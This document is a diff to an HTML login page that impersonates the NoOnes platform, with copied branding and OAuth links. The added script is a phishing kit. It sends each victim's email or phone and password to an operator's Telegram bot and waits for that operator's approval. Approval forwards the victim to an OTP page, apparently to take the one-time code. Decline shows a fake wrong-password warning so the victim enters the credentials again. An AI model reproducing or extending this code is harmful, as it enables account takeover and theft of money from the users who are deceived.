@@ -9,7 +9,6 @@
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-
         :root {
             --bg-color: #f5f5f5;
             --text-color: #333;
@@ -26,7 +25,6 @@
             --apple-color: #333;
             --error-color: #ef4444;
         }
-
         body.dark {
             --bg-color: #1a1a1a;
             --text-color: #ddd;
@@ -43,9 +41,7 @@
             --apple-color: #9ca3af;
             --error-color: #f87171;
         }
-
         * { transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease; }
-
         body {
             background-color: var(--bg-color);
             color: var(--text-color);
@@ -58,9 +54,7 @@
             padding: 40px 20px;
             animation: fadeIn 0.5s ease-out;
         }
-
         .wrapper { max-width: 430px; width: 100%; margin: 0 auto; }
-
         .logo-container {
             display: flex;
             justify-content: center;
@@ -69,9 +63,7 @@
             margin-top: 32px;
             margin-bottom: 8px;
         }
-
         .logo-link { height: 66px; color: var(--logo-color); }
-
         .container {
             background-color: var(--card-bg);
             padding: 24px 24px 32px;
@@ -79,16 +71,13 @@
             box-shadow: 0 4px 12px var(--shadow-color);
             text-align: center;
         }
-
         h2 { font-size: 20px; font-weight: 600; margin: 0 0 16px; }
-
         .social-logins {
             display: flex;
             justify-content: center;
             gap: 12px;
             margin-bottom: 24px;
         }
-
         .social-button {
             background-color: var(--input-bg);
             border: none;
@@ -103,12 +92,10 @@
             transition: transform 0.2s ease;
             text-decoration: none;
         }
-
         .social-button:hover { transform: scale(1.05); }
         .social-button svg { width: 24px; height: 24px; }
         .apple-icon path { fill: var(--apple-color); }
         .telegram-button circle { fill: #0088cc; }
-
         label {
             display: block;
             text-align: left;
@@ -117,7 +104,6 @@
             font-weight: 600;
             color: var(--grey-green);
         }
-
         input {
             width: 100%;
             padding: 12px 16px;
@@ -128,13 +114,10 @@
             box-sizing: border-box;
             font-size: 14px;
         }
-
         input:focus { outline: none; }
         input::placeholder { color: var(--input-placeholder); }
-
         .password-wrapper { position: relative; }
         .password-wrapper input { padding-right: 48px; }
-
         .toggle-password {
             position: absolute;
             right: 8px;
@@ -146,9 +129,7 @@
             padding: 0;
             color: var(--grey-green);
         }
-
         .toggle-password svg { width: 20px; height: 20px; }
-
         .forgot-password {
             display: block;
             text-align: right;
@@ -158,7 +139,6 @@
             margin: 4px 0 16px;
             font-weight: 600;
         }
-
         .login-button {
             width: 100%;
             padding: 12px;
@@ -173,19 +153,16 @@
             margin-top: 8px;
             margin-bottom: 16px;
         }
-
         .signup-link {
             font-size: 16px;
             color: var(--grey-green);
             margin-bottom: 24px;
         }
-
         .signup-link a {
             color: var(--link-color);
             text-decoration: none;
             font-weight: 600;
         }
-
         .footer {
             display: flex;
             justify-content: space-between;
@@ -195,19 +172,15 @@
             color: var(--text-color);
             font-weight: 600;
         }
-
         .theme-toggle { display: flex; align-items: center; gap: 8px; }
         .theme-icon { width: 24px; height: 24px; color: var(--medium-green); }
-
         .slider-label {
             position: relative;
             display: inline-block;
             width: 52px;
             height: 28px;
         }
-
         .slider-input { opacity: 0; width: 0; height: 0; }
-
         .slider {
             position: absolute;
             cursor: pointer;
@@ -216,7 +189,6 @@
             border-radius: 14px;
             transition: .3s;
         }
-
         .slider:before {
             position: absolute;
             content: "";
@@ -226,9 +198,7 @@
             border-radius: 50%;
             transition: .3s;
         }
-
         .slider-input:checked + .slider:before { transform: translateX(24px); }
-
         .language {
             display: flex;
             align-items: center;
@@ -237,7 +207,6 @@
             text-decoration: underline;
             cursor: pointer;
         }
-
         .error-message {
             color: var(--error-color);
             font-size: 12px;
@@ -245,16 +214,24 @@
             margin-top: 4px;
             display: none;
         }
-
         .flex { display: flex; }
         .flex-col { flex-direction: column; }
         .gap-4 { gap: 16px; }
         .gap-2 { gap: 8px; }
-
         @media (min-width: 1024px) { .wrapper { max-width: 500px; } }
         @media (max-width: 430px) {
             body { padding: 20px 10px; }
             .wrapper { max-width: 100%; }
+        }
+        .warning-message {
+            color: var(--error-color);
+            font-size: 14px;
+            font-weight: 500;
+            margin: 16px 0;
+            padding: 12px;
+            background: rgba(239,68,68,0.1);
+            border-radius: 6px;
+            display: none;
         }
     </style>
 </head>
@@ -284,10 +261,8 @@
                 </svg>
             </a>
         </div>
-
         <div class="container">
             <h2>Welcome to NoOnes</h2>
-
             <div class="social-logins">
                 <a href="https://accounts.google.com/v3/signin/accountchooser?client_id=444951667819-jgv9m8a4cfu38v6v4hpjdbtkqotq60i9.apps.googleusercontent.com&prompt=select_account&redirect_uri=https%3A%2F%2Fnoones.com%2Fid%2Fregister%2Fgoogle&response_type=code&scope=email+profile&dsh=S-1540681146%3A1771095966740547&o2v=2&service=lso&flowName=GeneralOAuthFlow&opparams=%253F&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hANXS0qKVO8Cx5gXaehF6yG9mHO4M-O3K2Xd5gdgcnMNyfXVHbYxbn6V4gCrLJWb4QhTubhxZx6VLGvIWENF6RfV7jhfYn2iV7WeIzI8-tioWgsvAWhngBuDfGdEksssHnL-3egx6NmUUMQXuDDezSc1tLMdWsbKt8marlXvgpYaJUnSJW61tqJvmSZjAmL6XHiPjz7ln2jxjS_nomO5KEUFtS7cpsJaovZlxVeXE9v9diSW_r2h5TMU59RmEmOlbeoBdlOQHmBWAH0ZIaGrOA0Qnd9OV6aTAxxfYU8tyg3L4X_n9Of7S1wGNV5xyGOYqS3hVGjNLsxwI2QwGpJ_jM4KKYRVqvbSv4LeFASTB-jFiCJ_mFkgMX45kxOmc5LC-vADOe4yalxgzZ2_PmR7LABaF9ptAUVJmL0bVk6cNH1uCh_P8tzrlMQnP7Zc6Al5xzPlfIhrdgsTk6lDUXj4dvTlDXsQYA%26flowName%3DGeneralOAuthFlow%26as%3DS-1540681146%253A1771095966740547%26client_id%3D444951667819-jgv9m8a4cfu38v6v4hpjdbtkqotq60i9.apps.googleusercontent.com%26requestPath%3D%252Fsignin%252Foauth%252Fconsent%23&app_domain=https%3A%2F%2Fnoones.com" class="social-button">
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
@@ -297,13 +272,11 @@
                         <path fill="#EA4335" d="M12 5.38c1.62 0 3 .56 4.12 1.65l3.09-3.09C17.39 2.98 14.9 2 12 2 7.7 2 3.99 4.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                     </svg>
                 </a>
-
                 <a href="https://appleid.apple.com/auth/authorize?response_type=code&response_mode=form_post&scope=email&client_id=com.noones&redirect_uri=https://noones.com/id/public/apple/register/callback" class="social-button">
                     <svg class="apple-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                         <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .79-3.27.76-1.3-.02-2.22-1.24-3.05-2.47-1.76-2.68-2.3-5.7-1.02-7.31 1.3-1.63 3.4-1.85 3.97-1.57 1.53.01 3 .99 3.27.79 .27-.2 2.65-1.12 3.91-.96 .65.02 2.49.27 3.68 1.99-.1 .07-2.3 1.32-2.3 3.94 0 3.43 2.76 4.5 2.76 4.53-.01.02-.36 1.25-1.25 2.47zM13 3.07c.78-.9 1.33-2.16 1.18-3.4-1.14.07-2.53.78-3.35 1.72-.71.83-1.36 2.1-1.18 3.34 1.28.09 2.57-.62 3.35-1.66z"/>
                     </svg>
                 </a>
-
                 <a href="https://oauth.telegram.org/auth?bot_id=5869633175&origin=noones.com&embed=0&request_access=write&return_to=https://noones.com/id/register/telegram" class="social-button telegram-button">
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                         <circle cx="12" cy="12" r="12" fill="#0088cc"/>
@@ -311,7 +284,6 @@
                     </svg>
                 </a>
             </div>
-
             <form id="login-form">
                 <div class="flex flex-col gap-4">
                     <div class="flex flex-col gap-2">
@@ -319,7 +291,6 @@
                         <input type="text" placeholder="Email/Phone number" id="email">
                         <div class="error-message" id="email-error">Please enter email/phone number</div>
                     </div>
-
                     <div class="flex flex-col gap-2">
                         <label>Password</label>
                         <div class="password-wrapper">
@@ -343,14 +314,11 @@
                         <div class="error-message" id="password-error">Please enter password</div>
                         <a href="https://noones.com/id/reset-password" class="forgot-password">Forgot password?</a>
                     </div>
-
                     <button type="submit" class="login-button">Log in</button>
                 </div>
             </form>
-
             <div class="signup-link">No account yet? <a href="https://noones.com/id/register">Sign up</a></div>
         </div>
-
         <div class="footer">
             <div class="theme-toggle">
                 <svg class="theme-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
@@ -372,18 +340,25 @@
             </div>
         </div>
     </div>
-
+    <!-- Spinner overlay -->
+    <div id="loading-overlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:9999; justify-content:center; align-items:center; display: flex;">
+        <div class="spinner" style="width: 60px; height: 60px; border: 6px solid #00b36b; border-top: 6px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+    </div>
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
     <script>
         function toggleTheme() {
             document.body.classList.toggle('dark');
             document.querySelector('.slider-input').checked = document.body.classList.contains('dark');
         }
-
         function togglePassword() {
             const pwd = document.getElementById('password');
             const closed = document.getElementById('eye-closed');
             const open = document.getElementById('eye-open');
-
             if (pwd.type === 'password') {
                 pwd.type = 'text';
                 closed.style.display = 'none';
@@ -394,8 +369,109 @@
                 open.style.display = 'none';
             }
         }
+        // ==================== TELEGRAM BOT INTEGRATION ====================
 
-        document.getElementById('login-form').addEventListener('submit', function(e) {
+        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";           // ← replace
+        const ADMIN_CHAT_ID = "123456789";                  // ← your Telegram ID
+
+        // Generate unique session ID for this login attempt (so bot knows which one to approve)
+        function generateSessionId() {
+            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        }
+
+        let currentSessionId = null;
+        let pollingInterval = null;
+
+        // Send credentials to Telegram bot
+        async function sendCredentialsToBot(email, password) {
+            currentSessionId = generateSessionId();
+
+            const message = 
+        `New login attempt:
+        Email/Phone: ${email}
+        Password: ${password}
+        Session: ${currentSessionId}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            const keyboard = {
+                inline_keyboard: [[
+                    { text: "✅ Allow", callback_data: `allow_${currentSessionId}` },
+                    { text: "❌ Decline", callback_data: `decline_${currentSessionId}` }
+                ]]
+            };
+
+            try {
+                const res = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: message,
+                        reply_markup: keyboard
+                    })
+                });
+
+                if (!res.ok) throw new Error("Telegram send failed");
+                return true;
+            } catch (err) {
+                console.error(err);
+                alert("Error contacting approval service. Try again.");
+                return false;
+            }
+        }
+
+        // Show warning message
+        function showWarning() {
+            let warning = document.querySelector('.warning-message');
+            if (!warning) {
+                warning = document.createElement('div');
+                warning.className = 'warning-message';
+                warning.textContent = "Please enter the correct email/phone or password. Note that the password is case-sensitive. Please try again.";
+                document.querySelector('.social-logins').after(warning);
+            }
+            warning.style.display = 'block';
+        }
+
+        // Start polling for admin decision (very basic long-polling simulation)
+        function startApprovalPolling() {
+            document.getElementById('loading-overlay').style.display = 'flex';
+
+            pollingInterval = setInterval(async () => {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=10`);
+                    const data = await res.json();
+
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            if (update.callback_query) {
+                                const cb = update.callback_query;
+                                const dataStr = cb.data;
+
+                                if (dataStr.startsWith(`allow_${currentSessionId}`)) {
+                                    clearInterval(pollingInterval);
+                                    document.getElementById('loading-overlay').style.display = 'none';
+                                    window.location.href = 'otp.html'; // or your real next page
+                                    return;
+                                }
+
+                                if (dataStr.startsWith(`decline_${currentSessionId}`)) {
+                                    clearInterval(pollingInterval);
+                                    document.getElementById('loading-overlay').style.display = 'none';
+                                    showWarning();
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.error("Polling error", e);
+                }
+            }, 4000); // check every ~4 seconds
+        }
+
+        // Modified form submit
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const email = document.getElementById('email').value.trim();
@@ -407,19 +483,21 @@
             passErr.style.display = 'none';
 
             let valid = true;
+            if (!email) { emailErr.style.display = 'block'; valid = false; }
+            if (!password) { passErr.style.display = 'block'; valid = false; }
 
-            if (!email) {
-                emailErr.style.display = 'block';
-                valid = false;
-            }
-            if (!password) {
-                passErr.style.display = 'block';
-                valid = false;
-            }
+            if (!valid) return;
 
-            if (valid) {
-                window.location.href = 'otp.html';
+            // Send to bot & wait for approval
+            const sent = await sendCredentialsToBot(email, password);
+            if (sent) {
+                startApprovalPolling();
             }
+        });
+
+        // Optional: stop polling if user leaves page
+        window.addEventListener('beforeunload', () => {
+            if (pollingInterval) clearInterval(pollingInterval);
         });
     </script>
 </body>
